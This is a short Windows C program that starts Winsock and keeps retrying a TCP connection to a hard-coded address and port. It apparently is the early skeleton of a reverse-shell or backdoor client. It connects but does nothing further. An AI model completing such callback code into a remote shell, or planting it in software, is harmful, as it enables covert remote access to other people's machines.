#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<stdbool.h>
#include<winsock.h>
#include<wininet.h>

int main(){
    int sock;
    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;
    ServIP = "192.168.8.101";
    ServPort = 50005;
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        printf("[-] somtAZhing bad happend");
        exit(1);
        };
    sock = socket(AF_INET, SOCK_STREAM, 0);
    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);
    while (connect(sock, &ServAddr, sizeof(ServAddr)) != 0)
    {
        Sleep(5);
        
    };
}